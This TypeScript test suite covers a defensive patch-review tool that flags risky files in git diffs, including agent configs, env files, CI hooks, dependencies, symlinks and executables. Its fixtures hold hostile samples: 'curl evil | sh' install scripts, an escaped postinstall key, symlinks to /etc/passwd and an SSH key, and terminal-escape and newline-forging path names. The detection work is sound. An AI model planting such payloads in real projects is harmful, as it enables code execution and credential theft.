import { describe, expect, it } from "bun:test";
import { readFileSync } from "node:fs";
import { join } from "node:path";
import { classifyPath, escapeGlob, formatPatchReview, parseDiffHeader, reviewPatch } from "./patch-review.js";

/** The security review's proof-of-concept patches (03c), each one a bypass of the first reviewer. */
const fixture = (name: string) => readFileSync(join(import.meta.dir, "fixtures", "patch-review", name), "utf8");

/** A diff that adds `path` with one line, as `git diff --binary` writes it. */
function added(path: string, body = "+x", mode = "100644"): string {
  return (
    `diff --git a/${path} b/${path}\nnew file mode ${mode}\nindex 0000000..1111111\n` +
    `--- /dev/null\n+++ b/${path}\n@@ -0,0 +1 @@\n${body}\n`
  );
}

const kinds = (patch: string) => reviewPatch(patch).flags.map((flag) => [flag.path, flag.kind]);

describe("classifyPath", () => {
  it.each([
    [".claude/settings.json", "agent-config"],
    ["sub/.claude/commands/x.md", "agent-config"],
    [".mcp.json", "agent-config"],
    [".cursor/rules/a.mdc", "agent-config"],
    [".vscode/settings.json", "agent-config"],
    [".vscode/tasks.json", "agent-config"],
    [".vscode/launch.json", "agent-config"],
    ["AGENTS.md", "agent-config"],
    ["docs/CLAUDE.md", "agent-config"],
    ["GEMINI.md", "agent-config"],
    [".envrc", "env-config"],
    [".env", "env-config"],
    [".env.local", "env-config"],
    [".npmrc", "env-config"],
    ["bunfig.toml", "env-config"],
    [".tool-versions", "env-config"],
    [".husky/pre-commit", "hooks-ci"],
    [".githooks/pre-push", "hooks-ci"],
    ["lefthook.yml", "hooks-ci"],
    [".pre-commit-config.yaml", "hooks-ci"],
    [".github/workflows/ci.yml", "hooks-ci"],
    [".gitlab-ci.yml", "hooks-ci"],
    [".circleci/config.yml", "hooks-ci"],
    [".devcontainer/devcontainer.json", "hooks-ci"],
    ["Makefile", "build"],
    ["flake.nix", "build"],
    ["../outside", "path-escape"],
    ["/etc/passwd", "path-escape"],
    // Case-insensitive checkouts (macOS, Windows) read these as the lower-case names.
    ["Claude.md", "agent-config"],
    [".Claude/settings.json", "agent-config"],
    [".Envrc", "env-config"],
    [".GITHUB/Workflows/x.yml", "hooks-ci"],
    // Widened lists (ADR 0002, 03c review follow-ups).
    ["package-lock.json", "dependency"],
    ["yarn.lock", "dependency"],
    ["pnpm-lock.yaml", "dependency"],
    ["bun.lock", "dependency"],
    ["sub/Cargo.lock", "dependency"],
    [".yarnrc.yml", "env-config"],
    [".mise.toml", "env-config"],
    [".pnpmfile.cjs", "build"],
    [".lintstagedrc", "hooks-ci"],
    [".lintstagedrc.json", "hooks-ci"],
    ["build.rs", "build"],
    ["tests/conftest.py", "build"],
    ["justfile", "build"],
    ["Justfile", "build"],
    ["Taskfile.yml", "build"],
    [".cursorrules", "agent-config"],
    [".windsurfrules", "agent-config"],
    [".github/copilot-instructions.md", "agent-config"],
    [".gemini/settings.json", "agent-config"],
    [".codex/config.toml", "agent-config"],
    [".agents/skills/x.md", "agent-config"],
    [".gitattributes", "git-config"],
    [".gitmodules", "git-config"],
    [".github//workflows/x.yml", "hooks-ci"],
  ])("flags %s as %s", (path, kind) => {
    expect(classifyPath(path)?.kind).toBe(kind as never);
  });

  it("leaves ordinary files alone", () => {
    for (const path of ["src/index.ts", "README.md", ".vscode/extensions.json", "docs/env.md", ".github/CODEOWNERS"]) {
      expect(classifyPath(path)).toBeNull();
    }
  });
});

describe("parseDiffHeader", () => {
  it("reads plain, spaced, renamed and quoted paths", () => {
    expect(parseDiffHeader("diff --git a/src/x.ts b/src/x.ts")).toBe("src/x.ts");
    expect(parseDiffHeader("diff --git a/a b/c b/a b/c")).toBe("a b/c");
    expect(parseDiffHeader("diff --git a/old.yml b/.github/workflows/new.yml")).toBe(".github/workflows/new.yml");
    expect(parseDiffHeader('diff --git "a/caf\\303\\251" "b/caf\\303\\251"')).toBe("café");
    expect(parseDiffHeader('diff --git "a/x\\ty" "b/q\\"x"')).toBe('q"x');
    // git apply strips the first component whatever it is (-p1), not only a/ and b/.
    expect(parseDiffHeader("diff --git c/.envrc d/.envrc")).toBe(".envrc");
    expect(parseDiffHeader('diff --git a/x "b/caf\\303\\251"')).toBe("café");
  });
});

describe("reviewPatch", () => {
  it("flags each sensitive class by path", () => {
    const patch = [".mcp.json", ".envrc", ".husky/pre-commit", "Makefile", "src/ok.ts"].map((p) => added(p)).join("");
    const review = reviewPatch(patch);
    expect(review.files).toBe(5);
    expect(review.flags.map((flag) => [flag.path, flag.kind])).toEqual([
      [".mcp.json", "agent-config"],
      [".envrc", "env-config"],
      [".husky/pre-commit", "hooks-ci"],
      ["Makefile", "build"],
    ]);
  });

  it("does not flag a package.json change to the version only", () => {
    const patch =
      "diff --git a/package.json b/package.json\nindex 1..2 100644\n--- a/package.json\n+++ b/package.json\n" +
      '@@ -1,6 +1,6 @@\n {\n   "name": "x",\n-  "version": "1.0.0",\n+  "version": "1.0.1",\n   "scripts": {\n     "test": "bun test"\n';
    expect(reviewPatch(patch).flags).toEqual([]);
  });

  it("flags a package.json hunk inside scripts, and an install hook anywhere", () => {
    const scripts =
      "diff --git a/package.json b/package.json\n--- a/package.json\n+++ b/package.json\n" +
      '@@ -3,4 +3,4 @@\n   "scripts": {\n-    "test": "bun test",\n+    "test": "curl evil | sh",\n     "build": "x"\n   },\n';
    expect(kinds(scripts)).toEqual([["package.json", "build"]]);
    const install =
      "diff --git a/pkg/a/package.json b/pkg/a/package.json\n--- a/pkg/a/package.json\n+++ b/pkg/a/package.json\n" +
      '@@ -9,2 +9,3 @@\n     "lint": "biome"\n+    "postinstall": "node x.js",\n   },\n';
    expect(kinds(install)).toEqual([["pkg/a/package.json", "build"]]);
    const after =
      "diff --git a/package.json b/package.json\n--- a/package.json\n+++ b/package.json\n" +
      '@@ -3,6 +3,6 @@\n   "scripts": {\n     "test": "bun test"\n   },\n-  "version": "1",\n+  "version": "2",\n';
    expect(kinds(after)).toEqual([]);
  });

  it("flags a dependency version bump only when it changes the source or adds a package", () => {
    const head = "diff --git a/package.json b/package.json\n--- a/package.json\n+++ b/package.json\n";
    const bump =
      head + '@@ -8,4 +8,4 @@\n   "dependencies": {\n-    "a": "1.0.0",\n+    "a": "^1.0.1",\n     "b": "2"\n   },\n';
    expect(kinds(bump)).toEqual([]);
    const source =
      head + '@@ -8,3 +8,3 @@\n   "dependencies": {\n-    "a": "1.0.0"\n+    "a": "github:evil/a"\n   },\n';
    expect(kinds(source)).toEqual([["package.json", "dependency"]]);
    const addition =
      head + '@@ -8,3 +8,4 @@\n   "devDependencies": {\n     "a": "1.0.0",\n+    "left-pad": "1.0.0"\n   },\n';
    expect(kinds(addition)).toEqual([["package.json", "dependency"]]);
  });

  it("flags trustedDependencies, overrides, bin and lint-staged changes in package.json", () => {
    const head = "diff --git a/package.json b/package.json\n--- a/package.json\n+++ b/package.json\n";
    for (const [key, kind] of [
      ["trustedDependencies", "dependency"],
      ["overrides", "dependency"],
      ["resolutions", "dependency"],
      ["bin", "build"],
      ["lint-staged", "hooks-ci"],
      ["simple-git-hooks", "hooks-ci"],
    ]) {
      const patch = `${head}@@ -1,3 +1,4 @@\n {\n   "name": "x",\n+  "${key}": {"x": "y"},\n   "version": "1"\n`;
      expect([key, kinds(patch)]).toEqual([key, [["package.json", kind]]]);
    }
  });

  it("flags a package.json change whose top-level key the hunk does not show (p5)", () => {
    // Fails on e67784d6: a script changed deep inside "scripts" (the hunk starts at s6) was not flagged.
    expect(kinds(fixture("p5.patch"))).toEqual([
      ["package.json", "package-json-unknown-section"],
      ["package.json", "dependency"],
    ]);
    // A JSON escape does not hide the key.
    const escaped =
      "diff --git a/package.json b/package.json\n--- a/package.json\n+++ b/package.json\n" +
      '@@ -1,2 +1,3 @@\n {\n+  "scr\\u0069pts": {"postinstall": "curl evil|sh"},\n   "name": "x"\n';
    expect(kinds(escaped)).toEqual([["package.json", "build"]]);
  });

  it("starts a file at a plain ---/+++ pair with no diff --git line (p1)", () => {
    // Fails on e67784d6: no `diff --git` line, so nothing was read and `.envrc` passed unflagged.
    expect(reviewPatch(fixture("p1.patch"))).toMatchObject({
      files: 1,
      flags: [{ path: ".envrc", kind: "env-config" }],
    });
  });

  it("consumes hunk bodies by their @@ counts, so a +++ line inside a hunk cannot move a flag (p2)", () => {
    // Fails on e67784d6: the in-hunk `+++ b/README.md` re-attributed the .envrc flag to README.md.
    const review = reviewPatch(fixture("p2.patch"));
    expect(review.flags.map((f) => [f.path, f.kind])).toEqual([[".envrc", "env-config"]]);
    expect(review.suggestions).toContain("git apply --exclude=.envrc changes.patch");
    // After the counts run out, a real header starts the next file, as in git.
    const next = `${added("x")}--- a/y\n+++ b/.github/workflows/w.yml\n@@ -0,0 +1 @@\n+on: push\n`;
    expect(kinds(next)).toEqual([[".github/workflows/w.yml", "hooks-ci"]]);
  });

  it("parses modes like git: leading zeros and trailing whitespace still make a symlink (p3, p3b)", () => {
    // Fails on e67784d6: `0120000` and `120000 ` did not match /^\d{6}$/, so no symlink flag.
    expect(kinds(fixture("p3.patch"))).toEqual([
      ["link", "symlink"],
      ["link", "path-escape"],
    ]);
    expect(kinds(fixture("p3b.patch"))).toEqual([
      ["link2", "symlink"],
      ["link2", "path-escape"],
    ]);
    expect(kinds(added("run", "+x", "100755 "))).toEqual([["run", "executable"]]);
  });

  it("matches sensitive names case-insensitively (p4)", () => {
    // Fails on e67784d6: Claude.md, .Envrc and .Claude/settings.json were not flagged.
    expect(kinds(fixture("p4.patch"))).toEqual([
      ["Claude.md", "agent-config"],
      [".Envrc", "env-config"],
      [".Claude/settings.json", "agent-config"],
    ]);
  });

  // a1-a4 each fail on acbe50d9: git apply writes the flagged file, the review derived one other name.
  it("classifies the -p0 name git keeps after a slash-less plain header (a1)", () => {
    const review = reviewPatch(fixture("a1-p0.patch"));
    expect(review.flags.map((f) => f.kind)).toEqual(["agent-config"]);
    expect(review.suggestions).toContain("git apply --exclude=.claude/settings.json changes.patch");
  });

  it("classifies a +++ name cut at a CR (a2)", () => {
    const review = reviewPatch(fixture("a2-cr.patch"));
    expect(review.flags.map((f) => f.kind)).toEqual(["agent-config"]);
    expect(review.suggestions).toContain("git apply --exclude=CLAUDE.md changes.patch");
  });

  it("classifies a +++ name with its timestamp cut (a3)", () => {
    const review = reviewPatch(fixture("a3-ts.patch"));
    expect(review.flags.map((f) => f.kind)).toEqual(["agent-config"]);
    expect(review.suggestions).toContain("git apply --exclude=CLAUDE.md changes.patch");
  });

  it("classifies the --- name git keeps when the +++ name only extends it (a4)", () => {
    const review = reviewPatch(fixture("a4-short.patch"));
    expect(review.flags.map((f) => f.kind)).toEqual(["build"]);
    expect(review.suggestions).toContain("git apply --exclude=Makefile changes.patch");
  });

  it("cuts a timestamp but not /dev/null into a sensitive name, and splits a header at a tab", () => {
    const gnu =
      "--- /dev/null\t1970-01-01 00:00:00.000000000 +0000\n+++ b/notes.txt\t2010-07-05 19:41:17\n@@ -0,0 +1 @@\n+x\n";
    expect(reviewPatch(gnu)).toEqual({ files: 1, flags: [], suggestions: [] });
    // A timestamp after a name holding spaces: only the timestamp is cut.
    const spaced = "--- /dev/null\n+++ b/my dir/CLAUDE.md 2010-07-05 19:41:17.000000000 +0000\n@@ -0,0 +1 @@\n+x\n";
    expect(kinds(spaced).map(([, kind]) => kind)).toEqual(["agent-config"]);
    expect(kinds("diff --git a/.envrc\tb/.envrc\nnew file mode 100644\n")).toEqual([[".envrc", "env-config"]]);
  });

  it("escapes glob characters in suggested --exclude values", () => {
    // Fails on e67784d6: `--exclude='.claude/[ab].md'` would also match `.claude/a.md`.
    expect(escapeGlob("a[b]*?\\c")).toBe("a\\[b\\]\\*\\?\\\\c");
    expect(reviewPatch(added(".claude/[ab]*.md")).suggestions).toContain(
      "git apply --exclude='.claude/\\[ab\\]\\*.md' changes.patch",
    );
  });

  it("shows control characters and newlines in paths escaped, in the box and the suggestions", () => {
    // Fails on e67784d6: a quoted name with a newline split the box and printed a forged row.
    const review = reviewPatch(
      'diff --git "a/.envrc\\n\\342\\200\\256x\\001" "b/.envrc\\n\\342\\200\\256x\\001"\nnew file mode 100644\n',
    );
    expect(review.flags.map((f) => f.kind)).toEqual(["env-config"]);
    const lines = formatPatchReview(review, (text) => text);
    expect(lines.some((line) => /[\n\x01\u202e]/.test(line))).toBe(false);
    expect(lines.join("|")).toContain("│ .envrc\\n\\u202ex\\x01  [env-config]");
    expect(review.suggestions).toContain("git apply --exclude=$'.envrc\\n\\u202ex\\x01' changes.patch");
  });

  it("flags a rename into .github/workflows", () => {
    const patch =
      "diff --git a/notes.txt b/.github/workflows/x.yml\nsimilarity index 100%\n" +
      "rename from notes.txt\nrename to .github/workflows/x.yml\n";
    expect(kinds(patch)).toEqual([[".github/workflows/x.yml", "hooks-ci"]]);
  });

  it("follows `rename to` when the header is ambiguous, without stripping a real a/ directory", () => {
    const patch =
      "diff --git a/x b/a/.envrc\nsimilarity index 100%\nrename from x\nrename to a/.envrc\n" +
      "diff --git a/y b/y\nsimilarity index 100%\nrename from y\nrename to a/Makefile\n";
    expect(kinds(patch)).toEqual([
      ["a/.envrc", "env-config"],
      ["a/Makefile", "build"],
    ]);
  });

  it("flags a symlink to /etc/passwd as a symlink that leaves the repository", () => {
    const patch = added("config", "+/etc/passwd\n\\ No newline at end of file", "120000");
    expect(kinds(patch)).toEqual([
      ["config", "symlink"],
      ["config", "path-escape"],
    ]);
    expect(kinds(added("link", "+../../.ssh/id_rsa", "120000"))).toEqual([
      ["link", "symlink"],
      ["link", "path-escape"],
    ]);
    expect(kinds(added("ok-link", "+docs/readme.md", "120000"))).toEqual([["ok-link", "symlink"]]);
  });

  it("flags new executables, mode changes to executable, and binaries", () => {
    expect(kinds(added("run.sh", "+echo", "100755"))).toEqual([["run.sh", "executable"]]);
    expect(kinds("diff --git a/tool b/tool\nold mode 100644\nnew mode 100755\n")).toEqual([["tool", "executable"]]);
    expect(kinds("diff --git a/x.bin b/x.bin\nindex 1..2\nBinary files a/x.bin and b/x.bin differ\n")).toEqual([
      ["x.bin", "binary"],
    ]);
    const gitBinary =
      "diff --git a/img.png b/img.png\nnew file mode 100644\nindex 0..1\nGIT binary patch\nliteral 3\nKcmZ?l\n\nliteral 0\nHcmV?d00001\n\n";
    expect(kinds(gitBinary)).toEqual([["img.png", "binary"]]);
  });

  it("flags paths with .. or a leading /", () => {
    expect(kinds("diff --git a/../x b/../x\n--- a/../x\n+++ b/../x\n")).toEqual([["../x", "path-escape"]]);
  });

  it("suggests a check and one exclude per flagged path, quoting odd names, and nothing for a clean patch", () => {
    const review = reviewPatch(added(".claude/it's.md") + added("Makefile"));
    // The attributed name first, then every other flagged name git could write (`-p0` keeps a/ and b/).
    expect(review.suggestions).toEqual([
      "git apply --check changes.patch",
      "git apply --exclude='.claude/it'\\''s.md' changes.patch",
      "git apply --exclude='a/.claude/it'\\''s.md' changes.patch",
      "git apply --exclude='b/.claude/it'\\''s.md' changes.patch",
      "git apply --exclude=Makefile changes.patch",
      "git apply --exclude=a/Makefile changes.patch",
      "git apply --exclude=b/Makefile changes.patch",
    ]);
    expect(reviewPatch(added("src/a.ts"))).toEqual({ files: 1, flags: [], suggestions: [] });
    expect(reviewPatch("")).toEqual({ files: 0, flags: [], suggestions: [] });
  });

  it("classifies a rename source, so renaming a sensitive file away is flagged (b4)", () => {
    // Fails on 639581b9: `rename from CLAUDE.md` was not classified when the header named another file.
    const review = reviewPatch(
      "diff --git a/foo b/foo\nsimilarity index 100%\nrename from CLAUDE.md\nrename to foo2\n" +
        "diff --git a/bar b/bar\nrename old .envrc\nrename new bar2\n",
    );
    expect(review.flags.map((f) => [f.path, f.kind])).toEqual([
      ["foo2", "agent-config"],
      ["bar2", "env-config"],
    ]);
    expect(review.suggestions).toContain("git apply --exclude=foo2 changes.patch");
    expect(review.suggestions).toContain("git apply --exclude=bar2 changes.patch");
  });

  it("excludes every raw name as written and after -p1 when a mode flag fires (b5)", () => {
    // Fails on 639581b9: after a slash-less plain header git keeps -p0 and writes evil/run.sh,
    // but only run.sh and lnk were suggested.
    const patch =
      "--- /dev/null\n+++ notes.txt\n@@ -0,0 +1 @@\n+hi\n" +
      "diff --git evil/run.sh evil/run.sh\nnew file mode 100755\n--- /dev/null\n+++ evil/run.sh\n@@ -0,0 +1 @@\n+#!/bin/sh\n" +
      "diff --git evil/lnk evil/lnk\nnew file mode 120000\n--- /dev/null\n+++ evil/lnk\n@@ -0,0 +1 @@\n+/etc/passwd\n";
    const review = reviewPatch(patch);
    expect(review.flags.map((f) => [f.path, f.kind])).toEqual([
      ["run.sh", "executable"],
      ["lnk", "symlink"],
      ["lnk", "path-escape"],
    ]);
    for (const name of ["evil/run.sh", "run.sh", "evil/lnk", "lnk"]) {
      expect(review.suggestions).toContain(`git apply --exclude=${name} changes.patch`);
    }
    expect(review.suggestions).not.toContain("git apply --exclude=notes.txt changes.patch");
  });

  it("excludes the name git keeps on a damaged timestamp: up to and after the last tab", () => {
    // Fails on 639581b9: git writes `x/a<TAB>b/CLAUDE.md <TAB>` (whitespace damage cuts after the last tab).
    const damaged = "--- /dev/null\n+++ b/x/a\tb/CLAUDE.md \t 2010-07-05 19:41:17\n@@ -0,0 +1 @@\n+x\n";
    expect(reviewPatch(damaged).suggestions).toContain("git apply --exclude=$'x/a\\tb/CLAUDE.md \\t' changes.patch");
    // A tab before the date: git cuts at the tab and keeps the space.
    const tabbed = "--- /dev/null\n+++ b/y/a\tb/CLAUDE.md \t2010-07-05\n@@ -0,0 +1 @@\n+x\n";
    expect(reviewPatch(tabbed).suggestions).toContain("git apply --exclude=$'y/a\\tb/CLAUDE.md ' changes.patch");
  });

  it("parses a long hostile diff --git header in linear time", () => {
    // Fails on 639581b9: each blank rescanned the rest of the line (1 MiB of tabs took ~11 s).
    const MiB = 1 << 20;
    for (const header of [`diff --git a/x${"\t".repeat(MiB)}b/x\n`, `diff --git a/x ${"y ".repeat(MiB / 2)}\n`]) {
      const start = performance.now();
      const review = reviewPatch(header);
      expect(performance.now() - start).toBeLessThan(150);
      expect(review.files).toBe(1);
    }
  });

  it("reviews a 20 MiB hostile patch in a few seconds", () => {
    const MiB = 1 << 20;
    const n = 4 * MiB;
    const patch = [
      `diff --git a/x${"\t".repeat(n)}b/x\n`,
      `diff --git a/x ${"y ".repeat(n / 2)}\n`,
      `--- /dev/null\n+++ b/${"a ".repeat(n / 2)}\n`,
      "--- a/x y z w\n+++ b/x y z w 2010-07-05 19:41:17\n".repeat(n / 50),
      "diff --git a/a b/a a/a b/a\nrename to a b c\n".repeat(n / 40),
    ].join("");
    expect(patch.length).toBeGreaterThan(19 * MiB);
    const start = performance.now();
    reviewPatch(patch);
    expect(performance.now() - start).toBeLessThan(5000);
  }, 30_000);

  it("formats a boxed warning with terminal controls stripped from the paths", () => {
    const review = reviewPatch(added(".claude/\x1b[2Jx.md"));
    const lines = formatPatchReview(review, (text) => text.replace(/\x1b\[2J/g, ""));
    expect(lines[0]).toStartWith("┌─ Patch review: 1 flag(s) in 1 file(s)");
    expect(lines.join("\n")).toContain("│ .claude/x.md  [agent-config]");
    expect(lines.join("\n")).toContain("Nothing was applied");
    expect(lines.join("\n")).toContain("run `git apply` from the repository root");
    expect(lines.join("\n")).not.toContain("\x1b");
    expect(lines.at(-1)).toStartWith("└");
    expect(formatPatchReview(reviewPatch(""), (text) => text)).toEqual([]);
  });
});
